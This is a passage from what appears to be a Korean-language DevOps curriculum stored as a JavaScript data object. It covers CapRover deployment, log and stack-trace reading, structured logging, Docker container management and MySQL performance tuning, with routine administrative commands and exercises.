3. 여전히 실패하면 컨테이너 재시작`},{heading:"5. 무중단 배포 심화",content:"배포 시 다운타임을 0으로 만드는 전략:",steps:[{label:"Blue-Green 배포",text:"기존(Blue)과 새(Green) 환경을 동시 운영 → 전환",note:"CapRover는 자동으로 Blue-Green 배포 수행"},{label:"Rolling 배포",text:"인스턴스를 하나씩 순차적으로 업데이트",code:`Instance Count: 3
1번 업데이트 → 2, 3번으로 트래픽
2번 업데이트 → 1, 3번으로 트래픽
3번 업데이트 → 1, 2번으로 트래픽`}]},{heading:"6. 리소스 제한과 모니터링",content:"컨테이너가 과도한 리소스를 사용하지 않도록 제한:",code:`# App Config → Advanced Settings
Memory Limit: 512MB (기본값)
CPU Shares: 1024 (상대적 비율)

# 메모리 초과 시:
- OOMKilled (Out Of Memory Killed)
- 컨테이너 강제 종료 → 자동 재시작
- 로그: FATAL: could not allocate memory`},{heading:"⚡ 고급 실습 과제",checklist:["백엔드 앱을 3개 인스턴스로 스케일 아웃","부하 테스트 도구(Apache Bench)로 100 req/s 전송하여 로드밸런싱 확인","헬스체크 엔드포인트 구현 및 테스트","의도적으로 하나의 컨테이너를 중지하고 트래픽이 다른 컨테이너로 이동하는지 확인","배포 시 다운타임 0초 달성 (브라우저 자동 새로고침 스크립트로 테스트)"]}]}}},{id:"1-3",name:"로그 읽기와 에러 해석",goal:"에러 로그를 보고 문제의 원인을 파악할 수 있다",hours:4,keywords:["log analysis","error debugging","stack trace"],tasks:["각 서비스(MySQL, Redis, PHP, React) 로그 형식 파악","의도적으로 에러 발생시키고 로그 분석","AI에게 에러 해결 질문 3회"],content:{beginner:{title:"초급: 로그의 기본 개념과 읽는 법",sections:[{heading:"📚 학습 목표",content:"로그가 무엇인지 이해하고, 각 서비스(MySQL, Redis, PHP, React)의 로그를 읽을 수 있다."},{heading:"1. 로그란 무엇인가?",content:"로그는 프로그램이 실행되면서 남기는 기록입니다. 일기장처럼 '언제, 무엇을, 어떻게' 했는지 기록합니다.",list:["정상 작동 로그: 사용자 로그인, 파일 업로드 성공 등","경고(Warning): 문제는 아니지만 주의가 필요한 상황","에러(Error): 요청 실패, 연결 오류 등","크리티컬(Critical): 서비스 중단급 심각한 문제"]},{heading:"2. 로그 레벨 이해하기",code:`# 로그 레벨 (심각도 순서)
DEBUG    → 개발자용 상세 정보
INFO     → 일반 정보 (사용자 로그인, API 호출)
WARNING  → 경고 (디스크 80% 사용, 느린 쿼리)
ERROR    → 오류 (DB 연결 실패, 파일 없음)
CRITICAL → 치명적 (서비스 중단, 메모리 고갈)

# 운영 환경에서는 보통 INFO 이상만 기록
# 개발 환경에서는 DEBUG까지 모두 기록`},{heading:"3. MySQL 로그 읽기",content:"CapRover의 MySQL 앱 로그에서 볼 수 있는 내용:",code:`# 정상 작동
2025-01-04T10:30:15.123Z [Note] Server socket created on IP: '0.0.0.0'.
2025-01-04T10:30:16.456Z [Note] mysqld: ready for connections.

# 새 연결
2025-01-04T10:35:20.789Z [Note] Access granted for user 'cms_user'@'172.17.0.5'

# 슬로우 쿼리 경고
2025-01-04T10:40:00.123Z [Warning] Query took 5.2 seconds: SELECT * FROM posts WHERE ...

# 에러
2025-01-04T10:45:30.456Z [ERROR] Access denied for user 'wrong_user'@'172.17.0.5'`},{heading:"4. Redis 로그 읽기",code:`# Redis 시작
1:M 04 Jan 2025 10:30:00.123 * Server initialized
1:M 04 Jan 2025 10:30:00.456 * Ready to accept connections

# 명령 실행 (DEBUG 모드)
1:M 04 Jan 2025 10:35:15.789 "GET" "session:user123"
1:M 04 Jan 2025 10:35:16.012 "SET" "session:user123" "..."

# 메모리 경고
1:M 04 Jan 2025 10:40:00.123 # WARNING: Memory usage is 80%

# 에러
1:M 04 Jan 2025 10:45:00.456 # ERROR: Out of memory`},{heading:"5. 백엔드(PHP/Node.js) 로그 읽기",code:`# PHP 로그 예시
[2025-01-04 10:30:15] INFO: User login successful (user_id: 123)
[2025-01-04 10:35:20] WARNING: Deprecated function called in /app/old_code.php:45
[2025-01-04 10:40:00] ERROR: Database connection failed: SQLSTATE[HY000] [2002] Connection refused

# Node.js 로그 예시
2025-01-04T10:30:15.123Z INFO  User authenticated: user123
2025-01-04T10:35:20.456Z WARN  API rate limit approaching (95/100)
2025-01-04T10:40:00.789Z ERROR Unable to fetch data from external API: ETIMEDOUT`},{heading:"6. 프론트엔드(React) 로그 읽기",content:"브라우저 콘솔과 서버 로그를 함께 봐야 합니다:",code:`# Vite 개발 서버 로그
10:30:15 AM [vite] page reload src/App.jsx
10:35:20 AM [vite] hmr update /src/components/Header.jsx

# 빌드 에러
10:40:00 AM [vite] Internal server error: Failed to parse source
  SyntaxError: Unexpected token '<' (12:5)

# 브라우저 콘솔 (개발자 도구 F12)
GET http://api.example.com/users 404 Not Found
Uncaught TypeError: Cannot read property 'map' of undefined`},{heading:"✅ 초급 실습",checklist:["CapRover에서 MySQL 로그를 10분간 관찰하고 3가지 유형의 로그 찾기","Redis 로그에서 메모리 사용량 관련 메시지 찾기","백엔드 로그에서 ERROR 레벨 메시지 1개 찾아 해석하기","브라우저 콘솔에서 404 에러 재현하고 원인 파악하기"]}]},intermediate:{title:"중급: 스택 트레이스 읽기와 에러 추적",sections:[{heading:"📚 학습 목표",content:"스택 트레이스를 읽고 에러가 발생한 정확한 위치와 원인을 파악할 수 있다."},{heading:"1. 스택 트레이스란?",content:"에러가 발생했을 때 함수 호출 경로를 역순으로 보여주는 로그입니다. '범인 추적'과 같습니다.",code:`# 예시: PHP 스택 트레이스
Fatal error: Uncaught Error: Call to undefined function connectDB()
Stack trace:
#0 /app/services/UserService.php(25): DatabaseHelper->query('SELECT * FROM...')
#1 /app/controllers/UserController.php(15): UserService->getUser(123)
#2 /app/routes.php(8): UserController->show()
#3 /app/index.php(30): handleRequest()

읽는 순서:
- 맨 위가 에러 발생 지점 (connectDB 함수가 없음)
- #0부터 역순으로 읽으면 호출 경로를 알 수 있음
- #0 → #1 → #2 → #3 순서로 함수가 호출됨`},{heading:"2. 실전 에러 분석 예시 1: DB 연결 오류",code:`# 로그
[2025-01-04 14:30:00] ERROR: SQLSTATE[HY000] [2002] Connection refused
  at PDO->__construct() in /app/database/Connection.php:15
  at Connection::connect() in /app/services/PostService.php:10
  at PostService->getAllPosts() in /app/controllers/PostController.php:20

분석:
1. Connection refused → MySQL이 중지되었거나 주소가 틀림
2. Connection.php:15 → DB 연결 설정 확인
3. 해결: CapRover에서 MySQL 앱이 Running 상태인지 확인`},{heading:"3. 실전 에러 분석 예시 2: Null Pointer",code:`# Node.js 에러
TypeError: Cannot read property 'username' of null
    at formatUser (/app/utils/format.js:12:20)
    at /app/routes/api.js:45:18
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)

분석:
1. format.js:12번째 줄에서 null.username 접근 시도
2. api.js:45에서 formatUser()를 호출했지만 null을 전달
3. 해결:
   - format.js에 null 체크 추가
   - 또는 api.js에서 호출 전 검증

수정 코드:
function formatUser(user) {
  if (!user) return { username: 'Guest' };  // null 체크 추가
  return { username: user.username };
}`},{heading:"4. 의도적으로 에러 발생시켜 로그 분석하기",content:"학습을 위해 일부러 에러를 만들어봅시다:",steps:[{label:"시나리오 1",text:"MySQL 앱 중지 → 백엔드 로그에서 DB 연결 에러 확인",code:`CapRover → MySQL → Stop
백엔드 로그: ECONNREFUSED 127.0.0.1:3306`},{label:"시나리오 2",text:"환경변수 잘못 설정 → 설정 에러 확인",code:`DB_HOST를 'wrong-host'로 변경 → 재배포
로그: getaddrinfo ENOTFOUND wrong-host`},{label:"시나리오 3",text:"API 엔드포인트 오타 → 404 에러",code:`GET /api/usres (오타) → 404 Not Found
로그: No route found for GET /api/usres`}]},{heading:"5. 에러 로그에서 해결 힌트 찾기",content:"좋은 에러 메시지는 해결 방법을 알려줍니다:",list:["Connection refused → 서비스가 꺼져있거나 방화벽 문제","ENOENT: no such file → 파일 경로 확인","Syntax Error → 코드 문법 오류, 해당 줄 확인","Port 3000 already in use → 다른 프로세스가 포트 사용 중","Out of memory → 메모리 부족, 컨테이너 제한 증가 필요"]},{heading:"6. AI에게 에러 해결 질문하는 법",code:`# 나쁜 질문
"에러가 나요"

# 좋은 질문
"CapRover에서 Node.js 백엔드를 배포했는데 다음 에러가 발생합니다:

Error: connect ECONNREFUSED 127.0.0.1:3306
    at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1148:16)

환경:
- Node.js 18, Express
- MySQL은 같은 CapRover에서 실행 중
- DB_HOST 환경변수: srv-captain--mysql

어떻게 해결하나요?"

→ AI가 정확한 답변 제공: "127.0.0.1이 아니라 srv-captain--mysql:3306으로 연결해야 합니다"`},{heading:"✅ 중급 실습",checklist:["각 서비스(MySQL, Redis, 백엔드)에서 의도적으로 에러 발생시키기","스택 트레이스를 읽고 에러 발생 파일과 줄 번호 찾기","AI(ChatGPT, Claude)에게 에러 로그를 제시하고 해결 방법 3가지 질문하기","에러를 수정하고 로그에서 정상 작동 확인"]}]},advanced:{title:"고급: 구조화된 로깅과 AI 활용 디버깅",sections:[{heading:"📚 학습 목표",content:"구조화된 로그를 설계하고, 로그 분석 도구 및 AI를 활용하여 효율적으로 디버깅한다."},{heading:"1. 구조화된 로깅이란?",content:"단순 텍스트 대신 JSON 형식으로 로그를 기록하면 검색과 분석이 쉬워집니다.",code:`# 기존 로그 (비구조화)
2025-01-04 10:30:15 User john logged in from 192.168.1.100

# 구조화된 로그 (JSON)
{
  "timestamp": "2025-01-04T10:30:15.123Z",
  "level": "INFO",
  "event": "user_login",
  "user_id": 123,
  "username": "john",
  "ip": "192.168.1.100",
  "user_agent": "Mozilla/5.0..."
}

장점:
- 특정 사용자의 모든 활동 검색 가능
- IP별 로그인 빈도 분석
- 자동화된 알림 (예: 같은 IP에서 10번 실패 시)`},{heading:"2. Winston으로 구조화된 로깅 구현 (Node.js)",code:`// npm install winston
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// 사용
logger.info('User login', {
  user_id: 123,
  username: 'john',
  ip: req.ip
});

logger.error('Database query failed', {
  query: 'SELECT * FROM users',
  error: err.message,
  duration_ms: 1234
});`},{heading:"3. 로그 쿼리와 분석",content:"JSON 로그는 jq 명령어로 쉽게 필터링할 수 있습니다:",code:`# 특정 사용자의 모든 활동
cat combined.log | jq 'select(.user_id == 123)'

# 에러만 필터링
cat combined.log | jq 'select(.level == "ERROR")'

# 느린 쿼리 찾기 (5초 이상)
cat combined.log | jq 'select(.duration_ms > 5000)'

# 시간대별 에러 카운트
cat combined.log | jq -r 'select(.level == "ERROR") | .timestamp' | cut -d'T' -f1 | sort | uniq -c`},{heading:"4. 중앙 집중식 로깅 (ELK Stack 개념)",content:"여러 서버의 로그를 한 곳에서 보는 방법:",list:["Elasticsearch: 로그 저장 및 검색","Logstash: 로그 수집 및 변환","Kibana: 시각화 대시보드"],code:`# 간단한 대안: Grafana Loki (무료)
# CapRover에 Loki 설치 가능
# 모든 컨테이너 로그 자동 수집
# 웹 UI에서 실시간 검색

예시 쿼리:
{app="backend"} |= "ERROR"  # 백엔드 에러만
{app="mysql"} | json | duration > 5s  # 느린 쿼리`},{heading:"5. AI 활용 고급 디버깅",content:"AI에게 복잡한 로그를 분석시키는 방법:",code:`# 프롬프트 예시
"다음은 최근 1시간 동안의 에러 로그입니다.
가장 자주 발생하는 에러 3가지를 찾고,
각각의 근본 원인과 해결 방법을 제시해주세요:

[로그 200줄 붙여넣기]

또한 이 에러들 사이의 연관성이 있다면 설명해주세요."

AI 활용 팁:
- 긴 로그는 요약해서 제공 (중복 제거)
- 환경 정보 함께 제공 (Docker, CapRover, Node.js 버전)
- 이미 시도한 해결 방법 명시
- 타임스탬프 포함 (시간대별 패턴 분석)`},{heading:"6. 실전: 프로덕션 로깅 전략",list:["로그 레벨: 프로덕션은 INFO, 개발은 DEBUG","민감정보 마스킹: 비밀번호, 토큰은 로그에 기록 금지","로그 로테이션: 오래된 로그 자동 삭제 (7일 보관)","성능 고려: 로그 과다 기록 시 I/O 병목","비용 절감: 클라우드 로깅 서비스는 GB당 과금"],code:`# 로그 로테이션 설정 (Linux logrotate)
/var/log/app/*.log {
  daily
  rotate 7
  compress
  missingok
  notifempty
  create 0644 app app
}

# 민감정보 마스킹 예시
logger.info('User login attempt', {
  username: 'john',
  password: '[REDACTED]',  // 절대 기록하지 말 것!
  ip: req.ip
});`},{heading:"⚡ 고급 실습 과제",checklist:["백엔드에 Winston 또는 Pino 로깅 라이브러리 적용","주요 이벤트 5가지를 JSON 형식으로 로깅 (로그인, 주문, 결제 등)","jq로 로그를 분석하여 '가장 많이 실패한 API' 찾기","AI에게 복잡한 에러 로그를 제공하고 근본 원인 분석 요청","로그 로테이션 설정하여 7일 이상 된 로그 자동 삭제"]}]}}}]},{id:"tier2",name:"Tier 2: 안정적 운영 기술",period:"3~4주",color:"bg-yellow-100 border-yellow-300 text-yellow-800",reason:"서비스를 안정적으로 유지하고 문제를 예방하기 위해",topics:[{id:"2-1",name:"Docker 기초와 컨테이너 관리",goal:"Docker의 기본 개념을 이해하고 컨테이너를 관리할 수 있다",hours:8,keywords:["Docker basics","container orchestration","volume management"],tasks:["Docker 명령어 10개 연습","볼륨 마운트 테스트","컨테이너 메모리 제한 설정"],content:{beginner:{title:"초급: Docker가 무엇인지 이해하고 기본 명령어 익히기",sections:[{heading:"📚 학습 목표",content:"Docker의 개념을 이해하고, 컨테이너를 조회/시작/중지/삭제할 수 있다."},{heading:"1. Docker란 무엇인가?",content:"Docker는 '컨테이너'라는 격리된 환경에서 애플리케이션을 실행하는 기술입니다.",list:["가상머신(VM)보다 가볍고 빠름","같은 서버에서 여러 앱을 독립적으로 실행","한 번 만든 이미지로 어디서든 똑같이 실행","CapRover는 Docker를 쉽게 관리해주는 도구"]},{heading:"2. 주요 개념",code:`# 이미지 (Image)
- 앱을 실행하기 위한 '템플릿' 또는 '레시피'
- 예: mysql:8.0, nginx:latest, node:18

# 컨테이너 (Container)
- 이미지로부터 생성된 '실행 중인 인스턴스'
- 하나의 이미지로 여러 컨테이너 생성 가능

# 비유
- 이미지 = 붕어빵 틀
- 컨테이너 = 틀로 만든 실제 붕어빵`},{heading:"3. 필수 Docker 명령어 10개",steps:[{label:"1. 실행 중인 컨테이너 보기",code:`docker ps
# CONTAINER ID   IMAGE     COMMAND   STATUS   PORTS   NAMES`},{label:"2. 모든 컨테이너 보기 (중지된 것 포함)",code:"docker ps -a"},{label:"3. 컨테이너 로그 보기",code:`docker logs <container_id>
docker logs -f <container_id>  # 실시간으로 계속 보기`},{label:"4. 컨테이너 내부 접속",code:`docker exec -it <container_id> bash
# MySQL 예시
docker exec -it mysql_container mysql -u root -p`},{label:"5. 컨테이너 시작/중지/재시작",code:`docker start <container_id>
docker stop <container_id>
docker restart <container_id>`},{label:"6. 컨테이너 삭제",code:`docker rm <container_id>
docker rm -f <container_id>  # 강제 삭제 (실행 중이어도)`},{label:"7. 이미지 목록 보기",code:"docker images"},{label:"8. 이미지 다운로드",code:`docker pull mysql:8.0
docker pull redis:alpine`},{label:"9. 컨테이너 리소스 사용량 확인",code:`docker stats
# CPU, 메모리, 네트워크 실시간 표시`},{label:"10. 컨테이너 상세 정보",code:`docker inspect <container_id>
# JSON 형식으로 모든 설정 정보 출력`}]},{heading:"4. CapRover에서 Docker 명령어 사용하기",content:"CapRover 서버에 SSH 접속 후 명령어 사용:",code:`# 1. CapRover 호스트에 SSH 접속
ssh root@your-server-ip

# 2. 실행 중인 컨테이너 확인
docker ps

# 3. MySQL 컨테이너 찾기
docker ps | grep mysql

# 4. MySQL 컨테이너 로그 보기
docker logs $(docker ps | grep mysql | awk '{print $1}')

# 5. MySQL 컨테이너 내부 접속
docker exec -it $(docker ps | grep mysql | awk '{print $1}') bash`},{heading:"✅ 초급 실습",checklist:["docker ps로 실행 중인 컨테이너 3개 이상 확인","각 컨테이너의 이름, 이미지, 상태 파악","docker logs로 MySQL 로그 확인","docker exec로 MySQL 컨테이너 내부 접속 후 exit로 빠져나오기","docker stats로 리소스 사용량 확인 (Ctrl+C로 종료)"]}]},intermediate:{title:"중급: 볼륨 마운트와 네트워크 이해하기",sections:[{heading:"📚 학습 목표",content:"Docker 볼륨으로 데이터를 영구 보존하고, 컨테이너 간 네트워크 통신을 이해한다."},{heading:"1. 볼륨이 필요한 이유",content:"컨테이너는 삭제되면 내부 데이터도 사라집니다. 볼륨을 사용하면 데이터를 컨테이너 외부에 저장할 수 있습니다.",list:["컨테이너 삭제 후 재생성해도 데이터 유지","여러 컨테이너가 같은 데이터 공유 가능","백업과 마이그레이션이 쉬움"]},{heading:"2. 볼륨 관련 명령어",code:`# 볼륨 목록 보기
docker volume ls

# 볼륨 상세 정보
docker volume inspect <volume_name>

# 볼륨 생성
docker volume create my_data

# 볼륨으로 컨테이너 실행
docker run -v my_data:/var/lib/mysql mysql:8.0

# 호스트 디렉토리 마운트
docker run -v /host/path:/container/path nginx

# 사용하지 않는 볼륨 삭제
docker volume prune`},{heading:"3. 실습: 볼륨 테스트",steps:[{label:"Step 1",text:"테스트 볼륨 생성",code:"docker volume create test_vol"},{label:"Step 2",text:"볼륨을 마운트한 컨테이너 실행",code:`docker run -it --rm -v test_vol:/data ubuntu bash
# 컨테이너 내부에서:
echo 'Hello Volume' > /data/test.txt
exit`},{label:"Step 3",text:"새 컨테이너로 같은 볼륨 확인",code:`docker run -it --rm -v test_vol:/data ubuntu bash
cat /data/test.txt  # Hello Volume 출력
exit`},{label:"결과",text:"컨테이너는 삭제되었지만 데이터는 볼륨에 보존됨!"}]},{heading:"4. Docker 네트워크",content:"컨테이너끼리 통신하려면 같은 네트워크에 있어야 합니다.",code:`# 네트워크 목록
docker network ls

# 컨테이너가 속한 네트워크 확인
docker inspect <container_id> | grep NetworkMode

# CapRover는 기본적으로 'captain-overlay-network' 사용
# 같은 네트워크의 컨테이너는 컨테이너명으로 통신 가능

# 예시: 백엔드에서 MySQL 접속
DB_HOST=srv-captain--mysql  # CapRover의 명명 규칙
DB_PORT=3306`},{heading:"5. CapRover에서 볼륨 확인",code:`# CapRover가 생성한 볼륨 보기
docker volume ls | grep captain

# MySQL 데이터 볼륨 찾기
docker volume ls | grep mysql

# 볼륨 백업 (호스트로 복사)
docker run --rm -v <volume_name>:/source -v $(pwd):/backup ubuntu tar czf /backup/backup.tar.gz -C /source .`},{heading:"✅ 중급 실습",checklist:["docker volume ls로 현재 볼륨 확인","MySQL 컨테이너가 사용하는 볼륨 찾기","테스트 볼륨 생성 후 데이터 보존 확인","docker network ls로 CapRover 네트워크 확인","컨테이너 간 통신 테스트 (백엔드 → MySQL)"]}]},advanced:{title:"고급: 리소스 제한과 컨테이너 최적화",sections:[{heading:"📚 학습 목표",content:"컨테이너의 CPU/메모리를 제한하고, 멀티 스테이지 빌드로 이미지를 최적화한다."},{heading:"1. 리소스 제한의 필요성",content:"한 컨테이너가 과도한 리소스를 사용하면 다른 컨테이너에 영향을 줍니다.",list:["메모리 제한 없으면 서버 전체 다운 가능","CPU 제한으로 공평한 자원 분배","I/O 제한으로 디스크 병목 방지"]},{heading:"2. 메모리 제한",code:`# 컨테이너 생성 시 메모리 제한
docker run -m 512m nginx  # 최대 512MB

# 실행 중인 컨테이너 업데이트
docker update --memory 1g <container_id>

# 메모리 초과 시 동작
--oom-kill-disable  # OOM Killer 비활성화 (위험!)
# 기본값: 메모리 초과 시 컨테이너 강제 종료

# CapRover에서 설정
# App Config → Memory Limit: 512MB`},{heading:"3. CPU 제한",code:`# CPU 코어 수 제한
docker run --cpus=1.5 nginx  # 1.5개 코어 사용

# CPU 상대 비율 (기본값: 1024)
docker run --cpu-shares=512 nginx  # 절반만 사용

# 특정 CPU 코어 지정
docker run --cpuset-cpus=0,1 nginx  # 코어 0, 1만 사용

# 확인
docker stats --no-stream
# CPU %가 설정한 한도를 넘지 않는지 확인`},{heading:"4. Dockerfile 최적화",content:"멀티 스테이지 빌드로 이미지 크기를 줄입니다:",code:`# Before: 1.2GB
FROM node:18
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "server.js"]

# After: 150MB (멀티 스테이지)
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:18-alpine
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY . .
CMD ["node", "server.js"]

# 크기 비교
docker images
# node:18         1.2GB
# node:18-alpine  150MB`},{heading:"5. 컨테이너 헬스체크",code:`# Dockerfile에 헬스체크 추가
HEALTHCHECK --interval=30s --timeout=3s --retries=3 \\
  CMD curl -f http://localhost:3000/health || exit 1

# 실행 중인 컨테이너에 헬스체크 추가
docker run --health-cmd='curl -f http://localhost || exit 1' \\
  --health-interval=30s nginx

# 헬스 상태 확인
docker ps
# STATUS: Up 2 minutes (healthy)`},{heading:"6. 로깅 드라이버 최적화",content:"로그가 무한정 쌓이지 않도록 제한:",code:`# 로그 크기 제한
docker run --log-opt max-size=10m --log-opt max-file=3 nginx

# JSON 파일 로깅 (기본값)
# /var/lib/docker/containers/<container_id>/<container_id>-json.log

# 로그 확인
docker logs --tail 100 <container_id>

# 로그 파일 직접 삭제 (주의!)
truncate -s 0 /var/lib/docker/containers/*/*-json.log`},{heading:"⚡ 고급 실습 과제",checklist:["컨테이너에 메모리 512MB 제한 설정 후 초과 테스트","CPU 제한 설정 후 docker stats로 확인","멀티 스테이지 Dockerfile 작성하여 이미지 크기 50% 이상 감소","헬스체크 설정 후 의도적으로 실패시켜 unhealthy 상태 확인","로그 크기 제한 설정 후 오래된 로그 자동 삭제 확인"]}]}}},{id:"2-2",name:"데이터베이스 운영 (MySQL)",goal:"MySQL을 안정적으로 운영하고 성능 문제를 파악할 수 있다",hours:10,keywords:["MySQL optimization","slow query","database maintenance"],tasks:["슬로우 쿼리 로그 활성화","현재 연결 수 확인하는 쿼리 실행","테이블별 용량 확인"],content:{beginner:{title:"초급: MySQL 기본 관리와 상태 확인",sections:[{heading:"📚 학습 목표",content:"MySQL 서버 상태를 확인하고, 기본적인 관리 작업을 수행할 수 있다."},{heading:"1. MySQL 운영이 중요한 이유",content:"데이터베이스는 서비스의 핵심입니다. 작은 문제가 전체 서비스 중단으로 이어질 수 있습니다.",list:["느린 쿼리 → 사용자 경험 저하 (로딩 5초 이상)","연결 수 초과 → 신규 사용자 접속 불가","디스크 용량 부족 → 데이터 입력 실패","백업 없음 → 데이터 손실 시 복구 불가"]},{heading:"2. MySQL 컨테이너 접속하기",steps:[{label:"방법 1: CapRover 대시보드",code:"Apps → MySQL 앱 → 우측 ... 메뉴 → Web Terminal"},{label:"방법 2: Docker 명령어",code:`# MySQL 컨테이너 찾기
docker ps | grep mysql

# 컨테이너 내부 접속
docker exec -it <container_id> bash

# MySQL 클라이언트 실행
mysql -u root -p$MYSQL_ROOT_PASSWORD`}]},{heading:"3. 서버 상태 확인 필수 명령어",code:`-- 1. 현재 연결 수 확인
SHOW STATUS LIKE 'Threads_connected';
-- 결과: Threads_connected | 15
-- 의미: 현재 15개 연결 활성화

-- 2. 최대 연결 수 확인
SHOW VARIABLES LIKE 'max_connections';
-- 기본값: 151
-- 15/151 = 10% 사용 중 (안전)

-- 3. 실행 중인 쿼리 확인
SHOW PROCESSLIST;
-- Id, User, Host, db, Command, Time, State, Info 표시
-- Time이 큰 쿼리 = 느린 쿼리

-- 4. 데이터베이스 목록
SHOW DATABASES;

-- 5. 현재 사용자 확인
SELECT USER(), DATABASE();`},{heading:"4. 테이블 용량 확인",code:`-- 데이터베이스별 용량
SELECT
  table_schema AS 'Database',
  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.tables
GROUP BY table_schema
ORDER BY SUM(data_length + index_length) DESC;

-- 특정 데이터베이스의 테이블별 용량
USE cms_database;
SELECT
  table_name AS 'Table',
  ROUND((data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)',
  table_rows AS 'Rows'
FROM information_schema.tables
WHERE table_schema = 'cms_database'
ORDER BY (data_length + index_length) DESC;

-- 결과 예시:
-- posts       15.23 MB    50000 rows
-- users        2.45 MB    10000 rows
-- sessions     1.12 MB    25000 rows`},{heading:"5. 기본 유지보수 작업",steps:[{label:"테이블 최적화",text:"데이터 삭제 후 공간을 회수합니다",code:`OPTIMIZE TABLE posts;
-- 결과: Table optimized`},{label:"테이블 검사",text:"데이터 손상 여부 확인",code:`CHECK TABLE posts;
-- 결과: OK 또는 repair 필요`},{label:"테이블 복구",text:"손상된 테이블 수리",code:"REPAIR TABLE posts;"}]},{heading:"6. 일반적인 문제와 해결",list:["연결 실패 → 방화벽, 비밀번호 확인","Too many connections → max_connections 증가 또는 유휴 연결 종료","Disk full → 오래된 로그 삭제, 불필요한 데이터 정리","Table is full → 테이블 용량 제한 확인 (InnoDB는 보통 무제한)"]},{heading:"✅ 초급 실습",checklist:["MySQL 컨테이너에 접속하여 root로 로그인","현재 연결 수와 최대 연결 수 확인","SHOW PROCESSLIST로 실행 중인 쿼리 확인","데이터베이스별 용량 확인 쿼리 실행","가장 큰 테이블 3개 찾기"]}]},intermediate:{title:"중급: 슬로우 쿼리 분석과 성능 튜닝",sections:[{heading:"📚 학습 목표",content:"느린 쿼리를 찾아내고, 인덱스를 활용하여 성능을 개선할 수 있다."},{heading:"1. 슬로우 쿼리 로그란?",content:"지정한 시간(예: 2초) 이상 걸리는 쿼리를 자동으로 기록하는 기능입니다.",list:["병목 쿼리를 식별할 수 있음","인덱스가 필요한 부분 파악","불필요한 JOIN이나 서브쿼리 발견","프로덕션에서는 항상 활성화 권장"]},{heading:"2. 슬로우 쿼리 로그 활성화",code:`-- 현재 설정 확인
SHOW VARIABLES LIKE 'slow_query%';
SHOW VARIABLES LIKE 'long_query_time';

-- 활성화 (재시작 시 유지하려면 my.cnf 수정 필요)
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 2;  -- 2초 이상 쿼리 기록
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';

-- my.cnf 영구 설정
[mysqld]
slow_query_log = 1
long_query_time = 2
slow_query_log_file = /var/log/mysql/slow.log
log_queries_not_using_indexes = 1  -- 인덱스 미사용 쿼리도 기록`},{heading:"3. 슬로우 쿼리 로그 분석",code:`# 로그 파일 확인
tail -f /var/log/mysql/slow.log

# 로그 예시
# Time: 2025-01-04T15:30:00.123456Z
# User@Host: cms_user[cms_user] @ 172.17.0.5
# Query_time: 5.234567  Lock_time: 0.000123  Rows_sent: 1000  Rows_examined: 500000
SELECT * FROM posts WHERE created_at > '2024-01-01';

-- 분석 포인트:
-- Query_time: 5.2초 (너무 느림!)
-- Rows_examined: 500000 (50만 행 검사)
-- Rows_sent: 1000 (1000행만 반환)
-- → 인덱스가 없어서 전체 테이블 스캔!`},{heading:"4. EXPLAIN으로 쿼리 분석",code:`-- 쿼리 실행 계획 확인
EXPLAIN SELECT * FROM posts WHERE created_at > '2024-01-01';

-- 결과 예시:
-- id | select_type | table | type | possible_keys | key  | rows   | Extra
-- 1  | SIMPLE      | posts | ALL  | NULL          | NULL | 500000 | Using where

-- type = ALL → 전체 테이블 스캔 (최악!)
-- rows = 500000 → 50만 행 검사

-- 인덱스 추가 후:
CREATE INDEX idx_created_at ON posts(created_at);

EXPLAIN SELECT * FROM posts WHERE created_at > '2024-01-01';
-- type = range → 범위 스캔 (좋음)
-- rows = 1000 → 1000행만 검사 (500배 개선!)`},{heading:"5. 인덱스 전략",content:"효과적인 인덱스 설계:",list:["WHERE 절에 자주 사용되는 컬럼","JOIN 조건에 사용되는 외래키","ORDER BY에 사용되는 컬럼","복합 인덱스는 카디널리티 높은 컬럼 우선"],code:`-- 단일 인덱스
CREATE INDEX idx_username ON users(username);

-- 복합 인덱스 (순서 중요!)
CREATE INDEX idx_user_created ON posts(user_id, created_at);
-- user_id로 필터링 후 created_at으로 정렬하는 쿼리에 최적

-- 유니크 인덱스
CREATE UNIQUE INDEX idx_email ON users(email);

-- 인덱스 목록 확인
SHOW INDEX FROM posts;

-- 인덱스 삭제
DROP INDEX idx_created_at ON posts;`},{heading:"6. 쿼리 최적화 팁",list:["SELECT * 대신 필요한 컬럼만 조회","LIMIT 사용하여 결과 제한","서브쿼리 대신 JOIN 사용 (대부분의 경우)","COUNT(*)보다 COUNT(id) 또는 캐시 활용","LIKE '%keyword%' 대신 전문 검색(Full-Text Search)"],code:`-- 나쁜 쿼리
SELECT * FROM posts WHERE title LIKE '%검색어%';
-- 인덱스 사용 불가, 전체 스캔

-- 개선 1: 전문 검색 인덱스
ALTER TABLE posts ADD FULLTEXT(title);
SELECT * FROM posts WHERE MATCH(title) AGAINST('검색어');

-- 개선 2: 접두어 검색
SELECT * FROM posts WHERE title LIKE '검색어%';
